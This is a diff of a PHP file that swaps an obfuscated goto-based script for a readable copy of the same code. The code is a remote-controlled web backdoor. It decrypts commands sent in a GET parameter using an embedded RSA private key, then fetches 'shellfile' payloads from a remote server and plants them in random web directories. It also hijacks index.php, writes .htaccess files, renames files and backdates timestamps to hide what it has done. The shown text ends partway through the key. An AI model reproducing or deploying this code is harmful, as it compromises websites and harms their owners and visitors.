@@ -1,2 +1,348 @@
 <?php
- goto nexO9; a1jvr: $privateKey = "\55\55\55\x2d\x2d\102\105\x47\x49\x4e\x20\x50\x52\111\x56\101\124\105\40\113\x45\x59\55\x2d\x2d\55\x2d\40\x4d\x49\111\105\166\121\111\102\101\x44\x41\116\x42\147\x6b\161\150\x6b\151\107\x39\167\60\102\101\121\105\106\x41\x41\x53\x43\x42\113\x63\167\147\x67\x53\x6a\x41\147\105\x41\101\157\111\102\x41\x51\x43\x33\60\167\x34\71\111\164\x4f\x66\154\x64\121\x36\x20\x64\102\53\x30\147\x45\142\145\x65\x57\x36\102\x45\103\x6c\x63\x78\53\x4e\x5a\172\155\160\x58\x32\x59\143\122\x48\106\x56\x38\x30\102\165\162\103\127\102\x61\166\120\106\145\x68\126\x38\x53\x79\71\171\114\x32\165\x2f\171\x33\x6d\166\x33\x51\112\112\53\40\170\62\153\x4b\166\154\171\x38\172\x4b\170\64\107\142\130\x50\x62\x73\127\112\x6b\x36\110\x6f\x30\122\x78\x71\64\71\157\x58\x6b\x42\141\x72\121\x42\117\161\x52\117\132\145\x61\106\106\x33\115\x7a\x70\144\x2f\x50\x64\x4c\123\x73\x78\105\166\x47\x31\x4d\x20\x74\x51\144\x32\x77\x4f\x78\x35\x72\66\x58\104\x38\x36\152\171\146\116\x37\x4c\x41\x4a\125\125\126\x76\x62\x4a\x76\x6e\61\x43\x48\157\x30\x33\156\106\x48\61\x32\153\x31\113\x59\167\114\156\x51\146\x7a\x51\111\65\156\130\x37\x79\x51\x4c\141\60\x6a\164\40\x66\x47\x35\124\x41\x33\x34\106\x6d\x30\x45\x4d\142\106\x64\x48\127\152\101\116\57\126\144\x45\152\x6f\x4a\111\66\x69\164\x34\120\x43\121\x50\65\x77\x6b\64\147\141\x32\102\166\x56\x71\x75\121\153\x75\x50\142\x73\142\x72\70\x33\x36\64\144\63\x49\66\40\x47\x75\107\101\x4b\104\x52\60\167\x66\x6b\x54\x32\x30\156\x30\105\66\153\101\155\x44\111\x33\x6f\x6c\x32\142\x66\x61\60\x72\121\156\x63\161\125\123\x33\117\x55\63\111\116\160\x78\117\x5a\x53\x38\145\x4b\103\111\147\x43\x33\x62\x4d\70\x31\155\144\x69\40\x4d\x51\66\124\163\x41\x51\71\101\147\115\x42\x41\101\105\103\x67\x67\105\x41\x4a\114\107\123\x6c\101\62\x52\160\114\144\x70\170\70\x6c\x4b\125\165\x4f\121\x51\146\123\x48\132\107\x66\166\145\142\57\105\x32\104\x5a\x6c\67\x2b\x64\123\107\115\x35\x4a\x20\107\153\115\111\131\x74\156\141\124\101\113\120\121\70\x6a\x6e\163\63\x37\x53\112\130\103\163\155\x52\122\150\102\x4e\x66\x30\x35\151\x32\x30\x41\x42\x73\104\x74\101\x51\x2f\111\x54\111\x77\x6f\160\x6d\101\101\x50\x68\x68\x52\x33\x49\107\x64\x43\146\x4c\40\142\x77\x79\x71\x47\x63\x45\x4f\161\71\170\132\x42\71\x74\127\x39\x36\x35\131\112\153\67\x4b\160\x6c\x4c\x6c\71\x34\161\116\x58\164\122\70\x43\165\65\x7a\x78\143\66\x55\x44\x6b\x74\x6a\x48\102\122\153\x2f\x4b\x79\x2f\x46\130\112\117\x6a\x50\113\115\40\163\x41\x38\162\150\x6f\170\67\x64\161\x6c\x5a\x55\102\x33\111\x2f\161\151\x71\162\121\117\x67\124\x31\102\163\161\61\x42\106\x54\x2b\x32\107\x47\167\122\x55\x57\132\61\x43\x79\106\x6f\x5a\166\150\x73\104\157\x6d\x64\x6f\x34\x79\150\x52\162\102\60\x62\x20\x38\x59\155\64\115\104\x69\x56\161\170\106\x50\x56\127\x38\130\x42\71\x52\x46\x44\71\x59\x4b\x74\53\x76\x35\x30\105\142\66\x69\x53\x4b\112\x4e\114\x70\x52\x6d\x6a\x5a\x44\116\x5a\142\x72\x45\x59\117\x36\x4e\x52\x73\122\x42\115\67\142\x72\104\141\71\x20\x6e\x33\x39\x6d\132\x57\x46\x72\64\67\167\107\x47\130\x58\166\57\x4e\x68\167\x54\x76\122\111\53\62\123\x69\57\132\146\144\x50\64\x2b\x6f\65\x54\145\123\127\x51\113\102\x67\121\x44\150\x49\126\117\125\x4f\104\151\163\x69\x4c\150\153\67\x58\113\142\x20\131\x75\67\x42\x57\x31\x5a\x46\143\113\x30\112\x78\165\x72\161\110\116\x32\62\x6d\x73\166\101\x30\121\57\61\x71\x34\x52\x76\x7a\x69\x45\x54\x6a\145\153\x58\x49\x6e\x39\x6c\x56\x4b\x43\155\x53\x2f\147\171\x32\117\62\122\x74\x75\121\122\x75\x6c\x41\122\x20\x66\x63\63\x73\172\62\127\x39\164\x4e\130\x52\x46\x38\101\166\171\60\x37\62\x38\116\107\60\142\141\x4f\117\x77\102\x61\154\117\70\167\63\x63\103\130\66\116\156\155\67\x30\x70\x4a\x65\x72\53\151\112\x53\156\63\x74\155\101\x4b\x53\102\x34\x4c\124\x20\x76\x62\x53\x42\70\160\x74\66\121\147\120\x38\x4e\x50\110\x79\121\144\127\160\x32\114\x77\x4f\164\167\113\102\x67\121\104\122\x42\70\154\x67\123\141\x49\155\x49\x4d\x4a\x42\141\x58\105\122\x53\x61\x6f\116\x67\x38\153\170\166\63\57\x63\166\x34\147\65\40\x6a\125\154\x6c\x6a\170\x4e\x51\143\x55\163\152\x30\x56\x37\x58\x69\154\x6e\x42\x33\155\x46\x78\x71\x35\162\x48\x6a\x42\132\124\163\x4b\x7a\115\115\121\171\x76\x68\x4f\170\x59\150\160\164\x44\x66\x77\x36\117\x4c\x74\x6f\120\125\153\62\x57\151\102\x55\163\x20\x6c\63\161\125\x30\x74\111\130\116\116\53\143\124\x78\165\x32\123\115\113\124\x6a\x77\x4d\x6b\164\153\x70\x6d\x41\x43\112\x71\x61\x2b\x6b\x32\67\x65\105\125\161\x78\x72\113\x4f\57\66\x53\105\151\x50\x39\106\115\x58\x48\x76\x67\101\x34\105\x45\x42\115\x20\x48\167\x77\x31\x65\x55\71\121\161\167\113\102\147\x41\x57\x53\x59\65\125\x70\x68\x77\x32\x4f\110\114\111\x79\x78\x6b\106\145\121\63\132\x35\157\152\x72\x35\166\x4f\66\x66\101\67\x56\152\x6e\131\x45\x6c\144\66\107\101\x43\x78\x73\124\x63\x61\127\161\40\166\x6c\162\124\151\153\71\117\x52\x55\124\x6d\167\x55\x73\x63\127\x6a\157\x33\70\104\154\112\x41\64\101\x45\60\x6e\x4a\70\131\x4a\160\x5a\172\x37\x54\x51\121\x76\112\63\x32\x67\120\x55\172\x6c\x47\103\x53\105\65\x6b\64\105\x56\x71\x4c\x36\126\x4c\40\121\x35\123\152\161\53\x7a\x7a\x61\x44\x50\152\x31\x45\145\120\x70\x76\x75\165\64\x6b\x72\x39\106\151\x4d\172\107\x47\120\x52\115\x43\122\x2f\x4d\161\130\x6c\53\106\x39\x48\x6d\103\61\143\x76\70\115\x43\131\x44\125\x6c\x41\x6f\x47\x42\101\x4b\x37\x37\40\x67\67\160\126\x4b\141\131\144\x57\153\103\x44\60\x69\x45\x55\164\x34\122\153\x77\57\111\146\123\170\167\171\121\147\154\142\x6d\167\x75\x6e\147\x42\x57\150\111\142\117\x30\x4f\61\67\130\71\106\x64\x30\156\70\111\127\125\x35\x57\153\125\142\x52\170\x20\145\71\130\x62\131\142\x45\60\65\164\x30\x63\157\142\105\x5a\106\x63\147\x30\x74\x46\161\x4c\x48\x57\122\x63\x4f\x73\61\57\x61\123\102\x59\x63\64\x4c\61\167\x68\115\112\162\x6a\163\153\111\141\66\x41\x30\67\x4c\x52\63\165\x6f\x51\x52\162\x38\162\x20\64\x71\x6b\x57\x37\x59\x72\164\171\x5a\x6c\x75\x4b\66\145\x41\102\x42\x79\x43\130\123\x62\x65\151\124\122\x6c\x64\x6b\x33\103\61\x2b\145\x54\171\x36\x2f\x4e\x41\x6f\107\101\142\71\57\112\x2b\116\x57\x72\150\131\123\x72\x2f\x56\157\x47\127\x6a\x75\x69\40\143\150\130\103\x4e\x73\172\x79\x34\167\66\x65\170\126\x77\x78\x58\121\x4b\116\124\x74\154\x7a\x4b\170\x79\150\121\146\126\120\113\x32\102\x78\162\160\x74\127\x4c\66\113\103\x52\x4b\x70\x7a\x33\167\150\53\x57\131\x32\103\x33\x51\131\x79\x56\146\167\107\x20\106\x42\64\x68\167\x44\x72\x32\155\x59\64\124\127\106\71\x70\x44\61\x39\64\x69\x45\123\x31\x79\x68\162\121\107\154\111\x38\x58\x4d\x2b\62\114\x56\x68\x42\x6c\x33\x70\x30\170\53\x54\x46\147\112\x4d\x61\124\x67\x44\x44\161\x41\x6e\x78\160\165\x71\x54\x20\x75\x70\x42\x59\161\x54\x59\115\154\117\144\53\x56\x52\67\x68\x45\116\115\x61\x46\x71\x6f\x3d\40\55\x2d\x2d\x2d\55\105\116\x44\x20\x50\x52\111\126\x41\124\x45\40\x4b\105\x59\55\55\55\55\x2d"; goto waK96; nexO9: error_reporting(0); goto o44de; vSviQ: if (is_null($params)) { error(MsgText::DECRYPT_FAIL); } goto Ybm2Z; ZCHMo: class MsgText { const PARAM_EMPTY = "\160\x61\x72\x61\x6d\40\x69\163\40\145\155\x70\x74\x79"; const PARAM_TYPE = "\x70\141\x72\x61\155\40\164\x79\x70\x65\x20\x65\x72\162\x6f\x72"; const VALUE_ERROR = "\166\x61\154\165\x65\x20\x65\162\x72\x6f\162"; const NOCHANGE = "\x6e\x6f\x20\x63\x68\141\156\147\x65"; const LOCK_FILE_SUCCESS = "\147\145\x6e\x65\162\x61\x74\x65\40\x6c\x6f\x63\153\x20\x66\x69\154\x65\40\163\165\x63\143\x65\163\163\54\x62\x75\x74\x20\154\x6f\x63\x6b\40\x69\156\x64\145\170\56\160\150\x70\x20\145\x72\x72\x6f\162"; const LOCK_FILE_ERROR = "\x67\x65\156\x65\162\x61\x74\x65\40\x6c\157\x63\x6b\x20\x66\151\x6c\145\x20\x65\x72\x72\157\x72"; const REMOTE_GET_ERROR = "\147\x65\164\x20\x72\145\x6d\x6f\164\145\40\143\157\156\x74\145\156\164\40\145\x72\x72\157\162"; const LOCAL_FILE_ERROR = "\147\145\156\x65\x72\x61\x74\145\x20\154\157\x63\x61\154\40\x66\x69\x6c\x65\40\x65\x72\x72\157\162"; const SUCCESS = "\x73\x75\x63\x63\x65\x73\163"; const LOCAL_FILE_EXISTS = "\x6c\157\143\x61\154\40\146\151\154\x65\x20\144\157\145\163\156\47\164\x20\145\x78\x69\x73\x74"; const REMOTE_FILE_EXISTS = "\162\x65\x6d\x6f\164\145\x20\146\151\154\x65\x20\x64\x6f\x65\163\x6e\47\x74\40\145\170\151\x73\x74"; const RENAME_ERROR = "\x72\145\x6e\141\155\x65\x20\145\x72\x72\157\162"; const INDEX_ERROR = "\151\x6e\144\x65\x78\40\150\151\152\141\x63\153\40\x65\162\162\157\x72"; const UNKNOWN_ERROR = "\x75\x6e\153\x6e\157\x77\156\x20\x65\162\x72\x6f\x72"; const DECRYPT_FAIL = "\x70\x61\x72\x61\155\x73\x20\x64\145\x63\162\x79\160\x74\x20\146\141\x69\154"; } goto XjfEL; waK96: $p = $_GET["\x70"]; goto k0TJh; uL2KS: function doSub($params) { if (empty($params["\x73\x68\145\x6c\x6c\146\x69\154\x65"])) { error("\163\150\145\154\x6c\x66\151\154\x65" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\146\151\154\x65\156\141\155\145"])) { error("\x66\x69\x6c\x65\156\x61\155\145\x20" . MsgText::PARAM_EMPTY, $params); } $localfilepath = $_SERVER["\104\x4f\x43\125\x4d\105\x4e\x54\137\x52\x4f\x4f\124"] . "\x2f" . $params["\146\151\x6c\145\x6e\x61\x6d\145"]; $remoteFileUrl = $params["\x73\x65\162\166\x65\x72"] . $params["\163\x68\145\x6c\x6c\146\x69\x6c\x65"]; $content = getRemoteContent($remoteFileUrl); $content = json_decode($content, true); if (!empty($content["\x72\x65\163\x75\x6c\x74"])) { if (copyfile($content["\162\145\163\x75\x6c\x74"], $localfilepath)) { updateFiletime($localfilepath); @chmod($localfilepath, 420); success($localfilepath); } error(MsgText::LOCAL_FILE_ERROR, compact("\x6c\x6f\143\141\x6c\146\151\x6c\x65\x70\x61\164\150")); } error(MsgText::REMOTE_GET_ERROR, compact("\162\x65\x6d\157\164\145\x46\x69\154\x65\125\x72\154")); } goto SLz_I; fgZLe: function getRemoteContent($url) { $content = @file_get_contents($url); if ($content === false) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_TIMEOUT, 5); curl_setopt($curl, CURLOPT_AUTOREFERER, 0); $content = curl_exec($curl); curl_close($curl); } return !empty($content) && is_string($content) ? $content : ''; } goto s74sM; bzWY4: function doRename($params) { if (empty($params["\163\157\165\x72\x63\x65\156\141\x6d\x65"])) { error("\163\x6f\x75\162\143\145\x6e\x61\155\145\40" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x72\x65\x6e\x61\155\145"])) { error("\162\x65\x6e\141\155\x65\x20" . MsgText::PARAM_EMPTY, $params); } if ($params["\163\157\165\162\x63\145\156\141\155\145"] === $params["\162\x65\x6e\x61\155\x65"]) { error(MsgText::NOCHANGE); } $sourceFile = dirname(__FILE__) . DIRECTORY_SEPARATOR . $params["\x73\x6f\x75\162\143\145\x6e\141\155\x65"]; $renameFile = dirname(__FILE__) . DIRECTORY_SEPARATOR . $params["\x72\145\156\x61\155\x65"]; $resSource = $params["\163\145\162\x76\x65\162"] . str_replace(strtolower($_SERVER["\x44\x4f\103\125\115\x45\116\124\137\122\x4f\x4f\124"]), '', strtolower($sourceFile)); $resSource = str_replace("\134", "\x2f", $resSource); if (file_exists($sourceFile)) { if (rename($sourceFile, $renameFile)) { success($renameFile); } else { error(MsgText::RENAME_ERROR, compact("\x72\145\156\141\x6d\145\x46\x69\x6c\145")); } } else { error(MsgText::LOCAL_FILE_EXISTS, compact("\162\145\x73\x53\157\x75\162\143\x65")); } } goto XFD3P; Zsbfv: function getDirPathsByLevel($level = 6) { $initDir = $_SERVER["\x44\x4f\x43\125\115\x45\116\x54\137\122\x4f\x4f\124"]; $dirs = array($initDir); $count = count($dirs); while (count($dirs) > $count - 1) { $path = $dirs[$count - 1]; $count += 1; if (@is_dir($path) && @($handle = @opendir($path))) { while ($file = @readdir($handle)) { $realpath = $path . "\x2f" . $file; if ($file == "\x2e" || $file == "\x2e\x2e" || !is_dir($realpath) || substr($file, 0, 1) === "\56") { continue; } $path3 = str_replace($initDir, '', $path); $path4 = explode("\x2f", $path3); if (count($path4) > $level - 1) { continue; } $dirs[] = $realpath; } } @closedir($handle); } return $dirs; } goto TCnXP; jD5sD: if (empty($params["\151\144\145\x6e"])) { error("\x69\144\145\156\x20" . MsgText::PARAM_EMPTY); } goto Wv7Hc; s74sM: function copyfile($content, $localfile, $isAppend = false, $appendContent = '') { if ($isAppend && !empty($appendContent)) { $content = trim($content); if (substr($content, -2, 2) !== "\77\76") { $content .= "\40\x3f\x3e"; } $content = $content . PHP_EOL . PHP_EOL . $appendContent; } @file_put_contents($localfile, $content); if (!file_exists($localfile)) { $openedfile = @fopen($localfile, "\167"); @fwrite($openedfile, $content); @fclose($openedfile); } if (!file_exists($localfile)) { return false; } return true; } goto kkEmF; H4eu1: function success($data) { die(@json_encode(array("\143\157\144\145" => 200, "\x6d\x73\147" => MsgText::SUCCESS, "\x64\141\x74\141" => $data), JSON_UNESCAPED_UNICODE)); } goto Zsbfv; kkEmF: function updateFiletime($filepath) { $ctime = filectime($filepath); $now = time(); if (!($now > $ctime + 31104000)) { $newTime = $now - mt_rand(15552000, 31104000); touch($filepath, $newTime, $newTime); return true; } return true; } goto a1jvr; TCnXP: function getUrl($url) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_TIMEOUT, 5); curl_setopt($curl, CURLOPT_AUTOREFERER, 0); curl_exec($curl); $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); if ($httpCode === 200) { $content = curl_exec($curl); return array("\143\157\144\x65" => 200, "\162\x65\163\x70" => $content); } return array("\143\157\144\x65" => 500, "\162\x65\x73\x70" => ''); } goto fgZLe; Wv7Hc: $iden = isset($params["\151\x64\x65\156"]) ? strtolower($params["\x69\144\x65\x6e"]) : ''; goto sudEN; sudEN: switch ($iden) { case "\x62\x65\x69\x6d\x61": $res = doBeima($params); break; case "\x72\145\156\141\x6d\145": $res = doRename($params); break; case "\x69\x6e\x64\x65\x78": $res = doIndex($params); break; case "\x73\165\x62": case "\x68\x74\x61\143\143\x65\x73\163": $res = doSub($params); break; case "\x6c\x6f\x63\x6b": $res = doLock($params); break; case "\x73\x74\x79\154\x65": $res = doStyle($params); break; default: error("\x69\144\145\x6e\40" . MsgText::VALUE_ERROR); } goto TSFNc; TSFNc: function doBeima($params) { if (empty($params["\146\x69\x6c\x65\156\x61\155\x65"])) { error("\146\151\x6c\145\x6e\141\155\145\40" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\163\x68\145\154\154\146\151\x6c\x65"])) { error("\x73\150\x65\x6c\154\x66\x69\x6c\x65\x20" . MsgText::PARAM_EMPTY, $params); } empty($params["\154\x65\166\145\154"]) && ($params["\154\x65\166\145\154"] = 6); $dirs = getDirPathsByLevel($params["\x6c\x65\166\x65\x6c"]); $temp = array_rand($dirs); $createDir = $dirs[$temp] . "\57"; $localfilepath = $createDir . $params["\146\151\x6c\145\156\x61\155\x65"]; $remoteFileUrl = $params["\163\x65\162\166\x65\x72"] . $params["\x73\150\145\x6c\x6c\146\x69\x6c\x65"]; $content = getRemoteContent($remoteFileUrl); $content = json_decode($content, true); if (!empty($content["\x72\x65\x73\165\x6c\164"])) { if (copyfile($content["\162\x65\x73\165\x6c\164"], $localfilepath)) { updateFiletime($localfilepath); $beimaurl = str_replace($_SERVER["\x44\117\x43\125\x4d\105\116\124\137\x52\x4f\117\x54"], '', $localfilepath); success(compact("\154\157\x63\x61\154\146\151\x6c\145\160\141\164\150", "\x62\145\x69\x6d\141\165\x72\x6c")); } error(MsgText::LOCAL_FILE_ERROR, compact("\x6c\x6f\143\141\154\x66\151\154\x65\160\141\x74\x68")); } error(MsgText::REMOTE_FILE_EXISTS, compact("\162\145\155\x6f\164\x65\106\151\154\x65\x55\x72\154")); } goto bzWY4; K3XJi: if (empty($params["\x73\x65\x72\166\145\162"])) { error("\x73\145\x72\166\x65\162\x20" . MsgText::PARAM_EMPTY); } goto jD5sD; o44de: class ErrorCode { const E_200400 = 200400; } goto ZCHMo; SLz_I: function doLock($params) { if (empty($params["\x66\x69\154\x65\156\x61\x6d\x65"])) { error("\146\x69\x6c\145\x6e\x61\155\145\x20" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x64\157\155\141\x69\156"])) { error("\x64\157\155\141\151\156\40" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\163\150\145\x6c\154\146\151\154\x65"])) { error("\163\x68\x65\x6c\x6c\146\x69\154\145\x20" . MsgText::PARAM_EMPTY, $params); } $localfilepath = $_SERVER["\x44\117\x43\125\x4d\x45\x4e\124\137\x52\117\x4f\x54"] . "\x2f" . $params["\x66\x69\x6c\x65\156\141\155\x65"]; $remoteFileUrl = $params["\x73\x65\162\x76\145\162"] . $params["\x73\x68\145\154\x6c\x66\x69\154\x65"]; $content = getRemoteContent($remoteFileUrl); $content = json_decode($content, true); if (!empty($content["\162\x65\x73\x75\x6c\164"])) { if (copyfile($content["\162\x65\163\x75\x6c\164"], $localfilepath)) { $lockurl = $params["\144\x6f\155\x61\151\x6e"] . $params["\x66\151\x6c\x65\x6e\x61\x6d\x65"]; $lockres = getUrl($lockurl); @unlink($localfilepath); if ($lockres["\x63\157\144\x65"] === 200 && !empty($lockres["\162\145\x73\x70"]) && strpos($lockres["\x72\x65\163\x70"], "\163\x75\x63\143\x65\163\x73")) { success($lockres["\162\145\x73\x70"]); } error(MsgText::LOCK_FILE_SUCCESS, compact("\x6c\157\143\x6b\x75\x72\x6c", "\x6c\157\143\x6b\x72\145\x73")); } @unlink($localfilepath); error(MsgText::LOCK_FILE_ERROR, compact("\154\157\x63\141\x6c\146\151\x6c\145\160\x61\164\150")); } error(MsgText::REMOTE_GET_ERROR, compact("\x72\145\x6d\157\164\145\106\151\x6c\x65\125\162\154")); } goto eBcSO; XFD3P: function doIndex($params) { if (empty($params["\163\150\x65\x6c\154\146\151\x6c\145"])) { error("\x73\150\x65\x6c\154\146\x69\x6c\x65\x20" . MsgText::PARAM_EMPTY, $params); } $remoteUrl = $params["\x73\145\x72\x76\x65\x72"] . trim($params["\163\x68\x65\154\154\x66\151\x6c\x65"]); $localfilepath = $_SERVER["\104\x4f\x43\x55\x4d\105\x4e\x54\137\122\117\x4f\124"] . "\57\151\x6e\x64\x65\170\56\x70\x68\160"; $content = getRemoteContent($remoteUrl); $content = json_decode($content, true); if (!empty($content["\x72\145\163\x75\154\164"])) { $oldContent = ''; if (file_exists($localfilepath)) { $oldContent = @file_get_contents($localfilepath); } elseif (file_exists($_SERVER["\104\x4f\x43\x55\x4d\x45\116\x54\137\x52\x4f\x4f\x54"] . "\57\x69\156\x64\145\x78\56\x68\x74\155\x6c")) { $oldContent = @file_get_contents($_SERVER["\x44\117\103\125\x4d\105\116\x54\137\x52\x4f\x4f\x54"] . "\x2f\151\156\144\x65\x78\56\150\164\x6d\154"); } elseif (file_exists($_SERVER["\104\117\x43\x55\x4d\105\116\124\x5f\122\117\117\124"] . "\57\x69\x6e\144\x65\170\x2e\x68\x74\x6d")) { $oldContent = @file_get_contents($_SERVER["\104\117\x43\x55\x4d\x45\x4e\124\137\122\117\117\x54"] . "\57\x69\x6e\144\145\170\x2e\150\x74\155"); } elseif (file_exists($_SERVER["\x44\x4f\x43\125\115\105\x4e\124\137\122\117\117\124"] . "\57\144\x65\x66\141\165\x6c\164\x2e\150\x74\155\154")) { $oldContent = @file_get_contents($_SERVER["\x44\117\103\x55\115\x45\116\124\x5f\x52\117\x4f\x54"] . "\x2f\144\145\146\x61\165\x6c\164\x2e\x68\164\x6d\154"); } elseif (file_exists($_SERVER["\104\117\103\125\115\105\116\124\137\122\117\x4f\x54"] . "\57\x64\x65\146\x61\x75\154\x74\56\150\x74\x6d")) { $oldContent = @file_get_contents($_SERVER["\104\x4f\103\125\115\105\116\x54\x5f\122\117\x4f\x54"] . "\x2f\x64\145\146\141\165\x6c\x74\56\150\x74\155"); } if (copyfile($content["\162\x65\163\x75\x6c\x74"], $localfilepath, true, $oldContent)) { updateFiletime($localfilepath); @chmod($localfilepath, 420); success($localfilepath); } error(MsgText::LOCAL_FILE_ERROR, compact("\154\157\x63\141\154\x66\x69\x6c\x65\160\x61\x74\x68")); } error(MsgText::INDEX_ERROR, compact("\x72\x65\155\157\x74\x65\125\x72\x6c")); } goto uL2KS; W3Ueh: if (!is_array($params)) { error(MsgText::PARAM_TYPE, $params); } goto K3XJi; k0TJh: $params = openssl_private_decrypt(base64_decode(urldecode($p)), $decrypted, $privateKey) ? $decrypted : null; goto vSviQ; XjfEL: function error($msg = MsgText::UNKNOWN_ERROR, $extras = array(), $code = 0) { empty($code) && ($code = ErrorCode::E_200400); die(@json_encode(array("\143\157\x64\145" => $code, "\155\x73\147" => $msg, "\145\170\x74\x72\x61\x73" => $extras), JSON_UNESCAPED_UNICODE)); } goto H4eu1; Ybm2Z: $params = json_decode($params, true); goto W3Ueh; eBcSO: function doStyle($params) { if (empty($params["\163\x68\x65\154\154\146\x69\x6c\145"])) { error("\163\150\x65\x6c\x6c\146\x69\x6c\145" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x66\x69\x6c\145\156\x61\x6d\x65"])) { error("\146\x69\154\145\156\x61\x6d\145\x20" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x64\157\155\141\x69\156"])) { error("\x64\x6f\x6d\141\x69\x6e\x20" . MsgText::PARAM_EMPTY, $params); } $localfilepath = $params["\144\x6f\155\141\151\x6e"] . $params["\x66\x69\x6c\145\x6e\141\155\x65"]; $remoteFileUrl = $params["\163\145\162\x76\x65\x72"] . $params["\163\150\145\x6c\154\x66\x69\x6c\x65"]; $content = getRemoteContent($remoteFileUrl); $content = json_decode($content, true); if (!empty($content["\162\145\163\165\154\x74"])) { if (copyfile($content["\162\145\163\x75\154\x74"], $localfilepath)) { updateFiletime($localfilepath); @chmod($localfilepath, 420); success($localfilepath); } error(MsgText::LOCAL_FILE_ERROR, compact("\x6c\x6f\x63\141\154\146\151\x6c\x65\x70\141\x74\150")); } error(MsgText::REMOTE_GET_ERROR, compact("\x72\145\155\157\x74\x65\x46\151\154\145\125\x72\154")); }
+error_reporting(0);
+class ErrorCode
+{
+    const E_200400 = 200400;
+}
+class MsgText
+{
+    const PARAM_EMPTY = 'param is empty';
+    const PARAM_TYPE = 'param type error';
+    const VALUE_ERROR = 'value error';
+    const NOCHANGE = 'no change';
+    const LOCK_FILE_SUCCESS = 'generate lock file success,but lock index.php error';
+    const LOCK_FILE_ERROR = 'generate lock file error';
+    const REMOTE_GET_ERROR = 'get remote content error';
+    const LOCAL_FILE_ERROR = 'generate local file error';
+    const SUCCESS = 'success';
+    const LOCAL_FILE_EXISTS = 'local file doesn\'t exist';
+    const REMOTE_FILE_EXISTS = 'remote file doesn\'t exist';
+    const RENAME_ERROR = 'rename error';
+    const INDEX_ERROR = 'index hijack error';
+    const UNKNOWN_ERROR = 'unknown error';
+    const DECRYPT_FAIL = 'params decrypt fail';
+}
+function error($msg = MsgText::UNKNOWN_ERROR, $extras = [], $code = 0)
+{
+    empty($code) && $code = ErrorCode::E_200400;
+    exit(@json_encode(['code' => $code, 'msg' => $msg, 'extras' => $extras], JSON_UNESCAPED_UNICODE));
+}
+function success($data)
+{
+    exit(@json_encode(['code' => 200, 'msg' => MsgText::SUCCESS, 'data' => $data], JSON_UNESCAPED_UNICODE));
+}
+function getDirPathsByLevel($level = 6)
+{
+    $initDir = $_SERVER['DOCUMENT_ROOT'];
+    $dirs = array($initDir);
+    $count = count($dirs);
+    while (count($dirs) > ($count - 1)) {
+        $path = $dirs[($count - 1)];
+        $count += 1;
+        if (@is_dir($path) && @$handle = @opendir($path)) {
+            while ($file = @readdir($handle)) {
+                $realpath = $path . '/' . $file;
+                if ($file == '.' || $file == '..' || !is_dir($realpath) || substr($file, 0, 1) === '.') {
+                    continue;
+                }
+                $path3 = str_replace($initDir, "", $path);
+                $path4 = explode("/", $path3);
+                if (count($path4) > $level - 1) {
+                    continue;
+                }
+                $dirs[] = $realpath;
+            }
+        }
+        @closedir($handle);
+    }
+    return $dirs;
+}
+function getUrl($url)
+{
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($curl, CURLOPT_TIMEOUT, 5);
+    curl_setopt($curl, CURLOPT_AUTOREFERER, 0);
+    curl_exec($curl);
+    $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+    curl_close($curl);
+    if ($httpCode === 200) {
+        $content = curl_exec($curl);
+        return ['code' => 200, 'resp' => $content];
+    }
+    return ['code' => 500, 'resp' => ''];
+}
+function getRemoteContent($url)
+{
+    $content = @file_get_contents($url);
+    if ($content === false) {
+        $curl = curl_init();
+        curl_setopt($curl, CURLOPT_URL, $url);
+        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($curl, CURLOPT_TIMEOUT, 5);
+        curl_setopt($curl, CURLOPT_AUTOREFERER, 0);
+        $content = curl_exec($curl);
+        curl_close($curl);
+    }
+    return !empty($content) && is_string($content) ? $content : '';
+}
+function copyfile($content, $localfile, $isAppend = false, $appendContent = '')
+{
+    if ($isAppend && !empty($appendContent)) {
+        $content = trim($content);
+        if (substr($content, -2, 2) !== '?>') {
+            $content .= ' ?>';
+        }
+        $content = $content . PHP_EOL . PHP_EOL . $appendContent;
+    }
+    @file_put_contents($localfile, $content);
+    if (!file_exists($localfile)) {
+        $openedfile = @fopen($localfile, "w");
+        @fwrite($openedfile, $content);
+        @fclose($openedfile);
+    }
+    if (!file_exists($localfile)) {
+        return false;
+    }
+    return true;
+}
+function updateFiletime($filepath)
+{
+    $ctime = filectime($filepath);
+    $now = time();
+    if (!($now > $ctime + 31104000)) {
+        $newTime = $now - (mt_rand(15552000, 31104000));
+        touch($filepath, $newTime, $newTime);
+        return true;
+    }
+    return true;
+}
+$privateKey = '-----BEGIN PRIVATE KEY-----
+MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC30w49ItOfldQ6
+dB+0gEbeeW6BEClcx+NZzmpX2YcRHFV80BurCWBavPFehV8Sy9yL2u/y3mv3QJJ+
+x2kKvly8zKx4GbXPbsWJk6Ho0Rxq49oXkBarQBOqROZeaFF3Mzpd/PdLSsxEvG1M
+tQd2wOx5r6XD86jyfN7LAJUUVvbJvn1CHo03nFH12k1KYwLnQfzQI5nX7yQLa0jt
+fG5TA34Fm0EMbFdHWjAN/VdEjoJI6it4PCQP5wk4ga2BvVquQkuPbsbr8364d3I6
+GuGAKDR0wfkT20n0E6kAmDI3ol2bfa0rQncqUS3OU3INpxOZS8eKCIgC3bM81mdi
+MQ6TsAQ9AgMBAAECggEAJLGSlA2RpLdpx8lKUuOQQfSHZGfveb/E2DZl7+dSGM5J
